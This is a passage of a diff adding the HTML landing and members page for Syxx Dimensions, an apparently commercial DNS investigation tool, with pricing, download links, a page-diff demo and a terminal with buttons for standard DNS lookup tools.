@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Syxx Dimensions — DNS Investigation Suite</title>
+<link rel="icon" type="image/png" href="assets/syxx-favicon.png">
+
+<meta name="description" content="Every resolver tells a story. Syxx traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.">
+<meta name="keywords" content="DNS security, DNS investigation, DNS spoofing detection, DNS hijacking, DNS exfiltration, DNS censorship, resolver analysis, network security tool, macOS DNS tool, Windows DNS tool">
+<meta property="og:title" content="Syxx Dimensions — DNS Investigation Suite">
+<meta property="og:description" content="Syxx traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://syxx.app/">
+<meta property="og:image" content="https://syxx.app/assets/syxx-logo.png">
+<meta property="og:image:width" content="512">
+<meta property="og:image:height" content="512">
+<meta property="og:image:alt" content="Syxx Dimensions logo">
+<meta property="og:site_name" content="Syxx Dimensions">
+<meta property="og:locale" content="en_US">
+<link rel="canonical" href="https://syxx.app/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:site" content="@syxxdimensions">
+<meta name="twitter:title" content="Syxx Dimensions — DNS Investigation Suite">
+<meta name="twitter:description" content="Syxx traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.">
+<meta name="twitter:image" content="https://syxx.app/assets/syxx-logo.png">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"SoftwareApplication","name":"Syxx Dimensions","applicationCategory":"SecurityApplication","operatingSystem":"macOS, Windows, Ubuntu","description":"A DNS investigative and protection suite. Traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.","url":"https://syxx.app","softwareVersion":"0.9","offers":[{"@type":"Offer","price":"3.95","priceCurrency":"USD","description":"Monthly subscription"},{"@type":"Offer","price":"19.95","priceCurrency":"USD","description":"Yearly subscription"}],"author":{"@type":"Organization","name":"Syxx","url":"https://syxx.app"}}</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cinzel:wght@400..900&family=Jost:ital,wght@0,300..700;1,300..500&family=Cormorant+SC:wght@400;600;700&family=EB+Garamond:ital,wght@0,400..600;1,400..600&family=JetBrains+Mono:wght@400..600&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;background:radial-gradient(130% 80% at 15% 0%,#1a0c33 0%,#0b0518 55%);font-family:'Jost',system-ui,-apple-system,sans-serif;min-height:100vh;padding:44px 56px 100px;color:#c9c1e6}
+  h1,h2,h3,h4,h5,h6,.display-font,.brand,.card-title,.modal-title,.result{font-family:'Cinzel',Georgia,serif}
+  p,.hero-description,.subtitle,.lore,.narrative,.explanation{font-family:'EB Garamond',Georgia,serif;font-size:1.05rem;line-height:1.6}
+  .btn,.nav,.badge,th{font-family:'Jost',system-ui,-apple-system,sans-serif}
+  pre,code,td,.cmd,.term,.flow,.monospace{font-family:'Jost','Cascadia Mono',Consolas,ui-monospace,monospace}
+  a{color:#a78bff;text-decoration:none}
+  a:hover{color:#c4b3ff}
+  ::-webkit-scrollbar{width:10px;height:10px}
+  ::-webkit-scrollbar-thumb{background:rgba(124,92,255,.25);border-radius:8px}
+  .btn{cursor:pointer;transition:all .15s}
+  .btn:hover{filter:brightness(1.09);transform:translateY(-2px)}
+  .nav-links{display:flex;align-items:center;gap:16px}
+  .nav{cursor:pointer;transition:all .14s}
+  .nav:hover{color:#efeafe}
+  .page{display:none}
+  .page.on{display:block}
+  .cmd{cursor:pointer;transition:all .12s}
+  .cmd:hover{background:rgba(124,92,255,.16);border-color:#7c5cff}
+  input:focus{border-color:#7c5cff !important}
+  input::placeholder{color:#5f567f}
+  
+  /* Responsive design */
+  @media (max-width: 1024px) {
+    body { padding: 20px 24px 60px; }
+  }
+  @media (max-width: 768px) {
+    body { padding: 16px 16px 40px; }
+    .site-nav { flex-wrap: wrap; gap: 12px; padding: 12px 16px !important; }
+    .site-nav > div:first-child { flex: 1 1 100%; justify-content: center; }
+    .nav-spacer { display: none; }
+    .nav-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; width: 100%; }
+    .download-buttons { flex-wrap: wrap; }
+    .download-buttons a { flex: 1 1 calc(50% - 8px); min-width: 140px; justify-content: center; }
+    .pricing-cards { flex-wrap: wrap; }
+    .pricing-cards > div { flex: 1 1 100%; max-width: 400px; width: 100%; }
+    .hero-title { font-size: 32px !important; }
+    .hero-subtitle { font-size: 22px !important; }
+  }
+  @media (max-width: 480px) {
+    body { padding: 12px 12px 32px; }
+    .download-buttons a { flex: 1 1 100%; }
+    .hero-title { font-size: 26px !important; }
+    .hero-subtitle { font-size: 18px !important; }
+    .hero-description { font-size: 13px !important; }
+  }
+</style>
+<!-- Without JS the .page panels are all display:none except the one carrying
+     .on, so a non-JS fetch (or a crawler that does not run scripts) would see
+     the hero and nothing else. Reveal every panel instead. -->
+<noscript><style>.page{display:block !important}</style></noscript>
+</head>
+<body>
+
+    <!-- SITE NAV -->
+    <header>
+    <nav class="site-nav" role="navigation" aria-label="Main navigation" style="display:flex;align-items:center;gap:26px;padding:16px 34px;border-bottom:1px solid rgba(148,120,246,.12);max-width:1320px;margin:0 auto;border-radius:14px 14px 0 0">
+      <div style="display:flex;align-items:center;gap:11px">
+        <img src="assets/syxx-logo.png" width="40" height="40" alt="Syxx" style="filter:drop-shadow(0 0 8px rgba(255,45,120,.3))">
+        <div style="line-height:1"><div style="font:700 20px 'Cinzel',serif;background:linear-gradient(90deg,#ff9a3d,#ff2d78,#9a5cff);-webkit-background-clip:text;background-clip:text;color:transparent">Syxx</div><div style="font:600 13px 'Cinzel',serif;color:#c4b3ff;margin-top:2px">Dimensions</div></div>
+      </div>
+      <a class="nav" id="nav-account" href="#manage" data-action="show" data-arg="manage" style="display:none;align-items:center;gap:7px;margin-left:6px;padding:8px 14px;border-radius:10px;background:rgba(124,92,255,.14);border:1px solid rgba(160,140,255,.3);color:#c4b3ff;font:600 12.5px system-ui;cursor:pointer">◑ Account</a>
+      <div class="nav-links" style="display:flex;align-items:center;flex:1;justify-content:space-between;padding-left:15px">
+        <a class="nav" href="#cover" data-action="show" data-arg="cover" aria-label="Navigate to Home page" style="font:600 13.5px system-ui;color:#efeafe">Home</a>
+        <a class="nav" href="#warp" data-action="show" data-arg="warp" aria-label="Navigate to Warp page" style="font:600 13.5px system-ui;color:#b3a7d6">Warp</a>
+        <a class="nav" href="#terminal" data-action="show" data-arg="terminal" aria-label="Navigate to Terminal page" style="font:600 13.5px system-ui;color:#b3a7d6">Terminal</a>
+        <a class="nav" href="#pricing" data-action="show" data-arg="cover" aria-label="View pricing plans" style="font:600 13.5px system-ui;color:#b3a7d6">Pricing</a>
+        <a class="nav" href="#privacy" data-action="show" data-arg="privacy" aria-label="Navigate to Privacy policy" style="font:600 13.5px system-ui;color:#b3a7d6">Privacy</a>
+        <a class="nav" href="#license" data-action="show" data-arg="license" aria-label="View License agreement" style="font:600 13.5px system-ui;color:#b3a7d6">License</a>
+        <a class="nav" href="/docs/api" aria-label="API documentation" style="font:600 13.5px system-ui;color:#b3a7d6;text-decoration:none">API Docs</a>
+        <a class="nav" href="/docs/help" aria-label="Help and support" style="font:600 13.5px system-ui;color:#b3a7d6;text-decoration:none">Help</a>
+        <a class="nav" href="https://leaktest.syxx.app" aria-label="Free DNS leak test tool" style="font:600 13.5px system-ui;color:#2dd4bf;text-decoration:none">DNS Leak Test</a>
+        <a class="nav" href="#signin" data-action="show" data-arg="signin" aria-label="Activate Pro license" style="font:600 13.5px system-ui;color:#efeafe">Activate Pro</a>
+      </div>
+      <a class="btn" href="#create" data-action="show" data-arg="create" style="padding:9px 18px;border-radius:10px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 13px system-ui;box-shadow:0 8px 20px rgba(124,92,255,.4)">Create Account</a>
+    </nav>
+    </header>
+
+    <main style="max-width:1320px;margin:0 auto;border:1px solid rgba(148,120,246,.14);border-top:none;border-radius:0 0 14px 14px;padding:0 0 100px;min-height:860px">
+
+      <!-- ============ COVER ============ -->
+      <section id="cover" class="page on" style="padding:44px 48px 54px">
+        <div style="text-align:center;max-width:720px;margin:0 auto 8px">
+          <img src="assets/syxx-logo.png" width="118" height="118" alt="Syxx" style="border-radius:27px;box-shadow:0 0 70px rgba(140,80,240,.4),0 14px 40px rgba(0,0,0,.55);margin-bottom:18px">
+          <!-- One h1 for the document. "Dimensions" stays a separate styled box
+               (display:block span) so the .hero-title / .hero-subtitle @media
+               font-size rules above still hit both halves and nothing moves. -->
+          <h1 class="hero-title" style="font:700 44px 'Cinzel',serif;line-height:1.05;color:#efeafe;margin:0">Syxx <span class="hero-subtitle" style="display:block;font:600 30px 'Cinzel',serif;background:linear-gradient(90deg,#ff9a3d,#ff2d78,#9a5cff);-webkit-background-clip:text;background-clip:text;color:transparent;margin-top:4px">Dimensions</span></h1>
+          <div class="hero-description" style="font-family:'EB Garamond',serif;font-style:italic;font-size:18px;color:#9a8fc0;margin-top:14px">A DNS investigative and protection suite.</div>
+          <div style="font-size:14.5px;color:#b3a7d6;max-width:560px;margin:14px auto 0;line-height:1.55">Every resolver tells a story. Syxx traces DNS lookups end to end — spoofed answers, poisoned caches, silent exfiltration — and writes your resolver's story.</div>
+        </div>
+
+        <!-- downloads -->
+        <div class="download-buttons" style="display:flex;justify-content:center;gap:12px;margin:28px 0 8px">
+          <a id="dl-mac" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><img src="assets/logo-apple.svg" width="18" height="18" alt="" style="filter:brightness(0) invert(1)">Download for macOS</a>
+          <a id="dl-win" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><img src="assets/logo-windows.svg" width="18" height="18" alt="" style="filter:brightness(0) invert(1)">Windows</a>
+          <a id="dl-linux" class="btn" href="#" style="display:flex;align-items:center;gap:10px;padding:12px 22px;border-radius:12px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#efeafe;font:600 14px system-ui"><img src="assets/logo-ubuntu.svg" width="18" height="18" alt="" style="filter:brightness(0) invert(1)">Ubuntu (Mint)</a>
+        </div>
+        <div style="text-align:center;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:11.5px;color:#6f6597;margin-bottom:14px">v0.9 · .NET 10 · free local checks, forever<span id="osnote" style="color:#8a6ef0"></span></div>
+        <div style="text-align:center;margin-bottom:34px">
+          <a href="https://leaktest.syxx.app" class="btn" style="display:inline-flex;align-items:center;gap:10px;padding:12px 28px;border-radius:12px;background:rgba(45,212,191,.12);border:1px solid rgba(45,212,191,.35);color:#2dd4bf;font:600 14px system-ui;text-decoration:none;box-shadow:0 8px 20px rgba(45,212,191,.15)">🔒 Free DNS Leak Test — check if your DNS is leaking</a>
+        </div>
+
+        <!-- pricing -->
+        <h2 id="pricing" style="margin:0;font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8f83b8;text-transform:uppercase;text-align:center;margin-bottom:14px">Upgrade to Pro</h2>
+        <div class="pricing-cards" style="display:flex;justify-content:center;gap:16px;margin-bottom:40px">
+          <div style="width:300px;border-radius:16px;padding:22px 24px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.16)">
+            <h3 style="margin:0;font:600 17px 'Cinzel',serif;color:#efeafe">Monthly</h3>
+            <div style="font:600 34px 'Cinzel',serif;color:#efeafe;margin:8px 0 2px">$3.95<span style="font-size:14px;color:#8f83b8;font-family:Jost,system-ui"> / month</span></div>
+            <div style="font-size:12.5px;color:#9a8fc0;margin-bottom:16px">Billed monthly. Cancel anytime.</div>
+            <button type="button" class="btn" data-action="startCheckout" data-arg="monthly" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:block;width:100%;text-align:center;padding:11px;border-radius:11px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 13px system-ui">Subscribe monthly</button>
+          </div>
+          <div style="width:300px;border-radius:16px;padding:22px 24px;background:linear-gradient(160deg,rgba(124,92,255,.16),rgba(45,212,191,.05));border:1px solid rgba(160,140,255,.4);box-shadow:0 0 40px rgba(124,92,255,.15);position:relative">
+            <span style="position:absolute;top:-11px;left:24px;padding:4px 11px;border-radius:999px;background:#e0b45a;color:#241800;font:700 9px system-ui;letter-spacing:.1em;text-transform:uppercase">Best value · save 58%</span>
+            <h3 style="margin:0;font:600 17px 'Cinzel',serif;color:#efeafe">Yearly</h3>
+            <div style="font:600 34px 'Cinzel',serif;color:#efeafe;margin:8px 0 2px">$19.95<span style="font-size:14px;color:#8f83b8;font-family:Jost,system-ui"> / year</span></div>
+            <div style="font-size:12.5px;color:#9a8fc0;margin-bottom:16px">Billed annually. Wakes all three server wardens.</div>
+            <button type="button" class="btn" data-action="startCheckout" data-arg="yearly" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;display:block;width:100%;text-align:center;padding:11px;border-radius:11px;background:#7c5cff;color:#fff;font:600 13px system-ui;box-shadow:0 10px 26px rgba(124,92,255,.45)">Subscribe yearly</button>
+          </div>
+        </div>
+      </section>
+
+      <!-- ============ TERMINAL ============ -->
+      <section id="terminal" class="page" style="padding:34px 40px 46px">
+        <div style="display:flex;align-items:baseline;gap:12px;margin-bottom:10px"><h2 style="display:inline;font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8f83b8;text-transform:uppercase;margin:0">Remote Shell</h2><div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#8f83b8">Run the vantage-dependent modules from the server instead of your machine.</div></div>
+        <div style="display:flex;gap:10px;align-items:center;margin-bottom:10px;max-width:620px">
+          <div style="flex:1;display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22)"><span style="font:500 9px Jost,system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8">Domain</span><input id="term-domain" placeholder="example.com" style="flex:1;background:transparent;border:none;outline:none;color:#efeafe;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:13.5px" autocomplete="off" spellcheck="false"></div>
+        </div>
+        <div id="term-frame" style="border-radius:14px;overflow:hidden;background:#07040f;border:1px solid rgba(148,120,246,.2);box-shadow:0 30px 80px rgba(0,0,0,.5)">
+          <div id="term-bar" style="height:34px;display:flex;align-items:center;gap:9px;padding:0 14px;background:rgba(20,14,32,.9);border-bottom:1px solid rgba(148,120,246,.14)"><span id="term-dots" style="display:flex;gap:6px"><span style="width:10px;height:10px;border-radius:50%;background:#ff5f57"></span><span style="width:10px;height:10px;border-radius:50%;background:#febc2e"></span><span style="width:10px;height:10px;border-radius:50%;background:#28c840"></span></span><span id="term-title" style="flex:1;text-align:center;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#8f83b8">syxx@dimensions — remote shell — ssh syxx.app</span><span style="font:500 9px Jost,system-ui;letter-spacing:.1em;color:#6f6597;text-transform:uppercase">button-only</span></div>
+          <div id="term" style="padding:16px 18px;font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;font-size:12.5px;line-height:1.6;color:#c9c1e6;height:320px;overflow-y:auto;white-space:pre-wrap;user-select:text;-webkit-user-select:text" tabindex="-1"></div>
+        </div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px;margin-top:12px">
+          <button type="button" class="cmd" data-action="run" data-arg="prophet" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">syxx prophet</button>
+          <button type="button" class="cmd" data-action="run" data-arg="mirror" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">syxx mirror <span style="color:#e0b45a">pro</span></button>
+          <button type="button" class="cmd" data-action="run" data-arg="warp" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">syxx warp <span style="color:#e0b45a">pro</span></button>
+          <button type="button" class="cmd" data-action="run" data-arg="conclude" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">syxx conclude</button>
+          <button type="button" class="cmd" data-action="run" data-arg="help" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 13px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#8f83b8">help</button>
+        </div>
+        <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:12.5px;color:#6f6597;margin-top:10px">Portal, Glutton, and Cage read your local network and can only run inside the desktop app — they gain nothing from a remote vantage.</div>
+      </section>
+
+      <!-- ============ WARP ============ -->
+      <section id="warp" class="page" style="padding:34px 40px 50px">
+        <div style="display:flex;align-items:baseline;gap:12px;margin-bottom:4px"><span style="width:30px;height:30px;border-radius:8px;display:grid;place-items:center;background:rgba(124,92,255,.14);color:#a78bff;font-size:16px">⇌</span><h2 style="display:inline;font:600 26px 'Cinzel',serif;color:#efeafe;margin:0">Warp <span style="font:500 10px Jost,system-ui;letter-spacing:.1em;color:#e0b45a;vertical-align:middle">PRO</span></h2></div>
+        <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:15px;color:#9a8fc0;max-width:760px;margin-bottom:18px">Pull a page's HTML, CSS, and JavaScript as plain text from the syxx.app vantage and from your own device at the same instant — then diff them line by line to reveal what the network rewrote in transit.</div>
+
+        <!-- url bar -->
+        <div style="display:flex;gap:10px;margin-bottom:16px;max-width:820px">
+          <div style="flex:1;display:flex;align-items:center;gap:10px;padding:10px 15px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.2)"><span style="color:#2dd4bf;font-size:12px">🔒</span><span style="font-family:'JetBrains Mono',ui-monospace,monospace;font-size:13px;color:#efeafe">https://example-bank.com/login</span></div>
+          <span class="btn" style="padding:10px 22px;border-radius:10px;background:linear-gradient(120deg,#7c5cff,#5b3fd6);color:#fff;font:600 13px system-ui;box-shadow:0 8px 20px rgba(124,92,255,.4)">Warp &amp; Diff</span>
+        </div>
+
+        <!-- two terminals -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:16px">
+          <!-- remote -->
+          <div style="border-radius:13px;overflow:hidden;background:#07040f;border:1px solid rgba(45,212,191,.28)">
+            <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;background:rgba(45,212,191,.06);border-bottom:1px solid rgba(45,212,191,.18)"><span style="width:9px;height:9px;border-radius:50%;background:#2dd4bf;box-shadow:0 0 8px #2dd4bf"></span><span style="font:500 11px Jost,system-ui;letter-spacing:.08em;text-transform:uppercase;color:#2dd4bf">Remote · via syxx.app</span><span style="flex:1"></span><span style="font-family:'JetBrains Mono',ui-monospace,monospace;font-size:10.5px;color:#6f6597">198.71.60.193</span></div>
+            <pre id="remoteSrc" style="margin:0;padding:14px 16px;font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.65;color:#c9c1e6;height:300px;overflow:auto;white-space:pre"></pre>
+          </div>
+          <!-- local -->
+          <div style="border-radius:13px;overflow:hidden;background:#07040f;border:1px solid rgba(124,92,255,.28)">
+            <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;background:rgba(124,92,255,.06);border-bottom:1px solid rgba(124,92,255,.18)"><span style="width:9px;height:9px;border-radius:50%;background:#a78bff;box-shadow:0 0 8px #a78bff"></span><span style="font:500 11px Jost,system-ui;letter-spacing:.08em;text-transform:uppercase;color:#b9a9ff">Local · your device</span><span style="flex:1"></span><span style="font-family:'JetBrains Mono',ui-monospace,monospace;font-size:10.5px;color:#6f6597">192.168.1.24</span></div>
+            <pre id="localSrc" style="margin:0;padding:14px 16px;font-family:'JetBrains Mono',ui-monospace,SFMono-Regular,Menlo,monospace;font-size:11.5px;line-height:1.65;color:#c9c1e6;height:300px;overflow:auto;white-space:pre"></pre>
+          </div>
+        </div>
+
+        <!-- diff summary + controls -->
+        <div style="display:flex;align-items:center;gap:16px;margin-top:14px;flex-wrap:wrap">
+          <div style="display:flex;align-items:center;gap:9px;padding:10px 16px;border-radius:11px;background:rgba(255,77,109,.08);border:1px solid rgba(255,77,109,.3)"><span style="font-size:16px">⚠</span><span style="font-size:13px;color:#f0b8c2"><b style="color:#ff4d6d">2 differences</b> found — the remote copy injected a script and altered a form action not present on your device.</span></div>
+          <span style="display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:#8f83b8"><span style="width:11px;height:11px;border-radius:3px;background:rgba(255,77,109,.35)"></span>remote-only</span>
+          <span style="display:inline-flex;align-items:center;gap:6px;font-size:11.5px;color:#8f83b8"><span style="width:11px;height:11px;border-radius:3px;background:rgba(45,212,191,.3)"></span>local-only</span>
+          <span style="flex:1"></span>
+          <span class="btn" style="padding:9px 18px;border-radius:10px;background:rgba(124,92,255,.16);border:1px solid rgba(160,140,255,.35);color:#c4b3ff;font:600 12.5px system-ui">Inspect line-by-line</span>
+        </div>
+      </section>
+
+      <!-- ============ LICENSE ============ -->
+      <section id="license" class="page" style="padding:34px 48px 54px">
+        <div style="max-width:820px;margin:0 auto">
+          <div style="font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Legal</div>
+          <h2 style="font:600 28px 'Cinzel',serif;color:#efeafe;margin:8px 0 4px">End-User License Agreement</h2>
+          <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:14px;color:#9a8fc0;margin-bottom:22px">The same terms you accept on first run of the app.</div>
+          <div id="eula" style="font-family:'EB Garamond',serif;font-size:15px;line-height:1.6;color:#c9c1e6"></div>
+        </div>
+      </section>
+
+      <!-- ============ MEMBERS TERMINAL ============ -->
+      <section id="members" class="page" style="padding:34px 40px 46px">
+        <div style="display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:18px;flex-wrap:wrap">
+          <div>
+            <div style="font:500 10px Jost,system-ui;letter-spacing:.22em;color:#8a6ef0;text-transform:uppercase">Members Area</div>
+            <h2 style="font:600 26px 'Cinzel',serif;color:#efeafe;margin:6px 0 0 0">Remote Terminal</h2>
+            <div style="font-family:'EB Garamond',serif;font-style:italic;font-size:13px;color:#9a8fc0;margin-top:2px">Signed in as <span id="mem-email">••••••</span> · run the DNS wardens and tooling from the syxx.app vantage.</div>
+          </div>
+          <div style="display:flex;align-items:center;gap:10px"><span id="mem-plan" style="padding:7px 14px;border-radius:999px;background:rgba(224,180,90,.16);border:1px solid rgba(224,180,90,.4);color:#e0b45a;font:700 11px system-ui;letter-spacing:.08em">PRO</span><button type="button" class="btn" data-action="signOut" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:8px 15px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12px system-ui;cursor:pointer">Sign out</button></div>
+        </div>
+
+        <!-- variable bar -->
+        <div style="display:flex;gap:10px;align-items:center;margin-bottom:14px;flex-wrap:wrap">
+          <div style="flex:1;min-width:260px;display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22)"><span style="font:500 9px Jost,system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8">Domain</span><input id="m-domain" placeholder="github.com" style="flex:1;background:transparent;border:none;outline:none;color:#efeafe;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:13.5px"></div>
+          <div style="display:flex;align-items:center;gap:9px;padding:9px 14px;border-radius:10px;background:rgba(10,6,20,.6);border:1px solid rgba(148,120,246,.22)"><span style="font:500 9px Jost,system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8">Type</span><select id="m-type" style="background:transparent;border:none;outline:none;color:#efeafe;font-family:'JetBrains Mono',ui-monospace,monospace;font-size:13.5px"><option style="color:#000">A</option><option style="color:#000">AAAA</option><option style="color:#000">MX</option><option style="color:#000">TXT</option><option style="color:#000">NS</option><option style="color:#000">CNAME</option><option style="color:#000">SOA</option><option style="color:#000">CAA</option></select></div>
+          <button type="button" class="btn" data-action="mclear" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:9px 15px;border-radius:10px;background:rgba(255,255,255,.04);border:1px solid rgba(148,120,246,.24);color:#c9c1e6;font:600 12px system-ui;cursor:pointer">Clear</button>
+        </div>
+
+        <!-- command palette -->
+        <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:14px">
+          <div style="border-radius:12px;background:rgba(255,255,255,.02);border:1px solid rgba(148,120,246,.14);padding:13px 14px">
+            <h3 style="margin:0;font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:9px">Remote wardens</h3>
+            <div style="display:flex;flex-wrap:wrap;gap:8px">
+              <button type="button" class="cmd" data-action="runCmd" data-arg="prophet" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">prophet</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="mirror" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">mirror <span style="color:#e0b45a">pro</span></button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="warp" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">warp <span style="color:#e0b45a">pro</span></button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="conclude" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#a78bff">conclude</button>
+            </div>
+          </div>
+          <div style="border-radius:12px;background:rgba(255,255,255,.02);border:1px solid rgba(148,120,246,.14);padding:13px 14px">
+            <div style="font:700 9px system-ui;letter-spacing:.16em;text-transform:uppercase;color:#8f83b8;margin-bottom:9px">DNS tools</div>
+            <div style="display:flex;flex-wrap:wrap;gap:8px">
+              <button type="button" class="cmd" data-action="runCmd" data-arg="nslookup" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">nslookup</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="dig" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">dig</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="dnstwist" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">dnstwist</button>
+              <button type="button" class="cmd" data-action="runCmd" data-arg="whois" style="-webkit-appearance:none;appearance:none;background:none;border:none;font:inherit;color:inherit;padding:0;cursor:pointer;padding:7px 12px;border-radius:8px;background:rgba(255,255,255,.03);border:1px solid rgba(148,120,246,.2);font-family:'JetBrains Mono',ui-monospace,monospace;font-size:12px;color:#2dd4bf">whois</button>
